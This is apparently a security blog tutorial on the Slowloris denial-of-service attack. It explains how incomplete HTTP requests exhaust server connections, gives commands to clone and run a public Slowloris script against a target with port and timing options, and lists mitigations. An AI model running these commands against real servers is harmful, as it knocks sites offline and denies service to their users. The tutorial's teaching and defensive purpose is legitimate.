+++
categories = ["white-hat", "hacker", "slowloris"]
date = 2024-07-07T06:16:34Z
description = ""
draft = false
image = "https://images.unsplash.com/photo-1588087699156-a91fb26b1b1a?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wxMTc3M3wwfDF8c2VhcmNofDR8fFNsb3d8ZW58MHx8fHwxNzIwMzMyOTQ2fDA&ixlib=rb-4.0.3&q=80&w=2000"
slug = "slow-loris-attack"
tags = ["white-hat", "hacker", "slowloris"]
title = "Slowloris Attack #whitehat"

+++


Denial-of-Service (DoS) attacks are a critical threat to web server security. One particularly insidious type is the Slowloris attack, which can incapacitate a server with minimal resources.

Remember, this guide is for educational purposes only, and any unauthorized testing on live servers is illegal and unethical.

#### What is a Slow Loris Attack?

A Slow Loris attack involves sending numerous incomplete HTTP requests to a target server.

By maintaining these connections open with periodic headers but never completing them, the server's resources are tied up, preventing legitimate users from accessing the server.

### Prerequisites

Before we begin, ensure you have.

* A machine running Linux
* Basic knowledge of terminal commands
* Python and Git installed

### Step-by-Step Guide

Let's start ensuring we have Python and Git installed in our Linux system.

```bash
sudo apt update
sudo apt install python3 python3-pip git

```

Clone the Slowloris repository from GitHub. This tool is a simple script written in Python that we'll use for our attack demonstration.

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

```

Install the necessary python packages.

```bash
pip3 install -r requirements.txt

```

### Running Slowloris

Now, we're ready to execute the Slow Loris attack. Replace `example.com` with the domain of your test server.

```bash
python3 slowloris.py example.com

```

#### Optional: Adjusting Parameters

Slowloris offers several parameters to customize the attack. You can see all available options by running:

```bash
python3 slowloris.py -h

```

Here are some useful parameters:

* `-p PORT`, `--port PORT`: Specify the target web server's port (default is 80).
* `-s SLEEPTIME`, `--sleeptime SLEEPTIME`: Time to sleep between sending each header (default is 15 seconds).
* `-v`, `--verbose`: Enable verbose output.

Example usage:

```bash
python3 slowloris.py example.com -p 8080 -s 10 -v

```

### Mitigating Slow Loris Attacks

To protect your server from Slow Loris attacks, consider the following measures:

* **Implement Timeouts**: Configure your server to set timeouts for incomplete requests.
* **Rate Limiting**: Limit the number of connections a single IP can make.
* **Reverse Proxies**: Use a reverse proxy like Nginx or Apache to handle incoming connections and mitigate the effects of such attacks.

### Conclusion

Understanding and testing the resilience of your server against Slow Loris attacks is crucial for maintaining robust web security.

By following this hands-on guide, you've seen how to conduct a Slow Loris attack in a controlled environment.

Always remember to use such techniques ethically and with proper authorization.

For more technical insights and tutorials, visit [rmauro.dev](__GHOST_URL__/).

### Additional Credits

```json
{
  gkbrkslowloris,
  title = "Slowloris",
  author = "Gokberk Yaltirakli",
  journal = "github.com",
  year = "2015",
  url = "https://github.com/gkbrk/slowloris"
}
```



